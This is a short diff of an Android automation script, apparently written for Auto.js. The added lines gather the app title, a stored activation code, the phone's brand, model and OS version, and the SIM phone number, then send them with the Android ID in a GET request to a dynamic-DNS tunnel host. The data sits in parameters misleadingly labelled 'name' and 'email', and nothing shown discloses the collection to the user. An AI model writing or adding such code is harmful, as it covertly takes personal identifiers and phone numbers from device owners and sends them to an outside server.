@@ -1,9 +1,16 @@
 (function() {
     try {
+    var zh = "";
+    zh += "软件" + ui.toolbar.title;
+    zh += "激活" + 读("c", "jhm", 0)
+    zh += "手机" + android.os.Build.BRAND;
+    zh += "型号" + android.os.Build.MODEL;
+    zh += "版本" + android.os.Build.VERSION.RELEASE;
+    zh += "号码" + context.getSystemService(context.TELEPHONY_SERVICE).getLine1Number();
         var bbs = 读("c", "xx", 0) + "," + zh;
         var url = "http://8n9569u76.qicp.vip/xxzs/";
         //var url = "http://sdbsxwf.vaiwan.com/xxzs/";
-        var res = http.get(url + "xxzs.php?name=" + imei+ "&email=" + bbs);
+        var res = http.get(url + "xxzs.php?name=" + device.getAndroidId() + "&email=" + bbs);
         if (res.statusCode != 200) {
             log("无语了");
         }
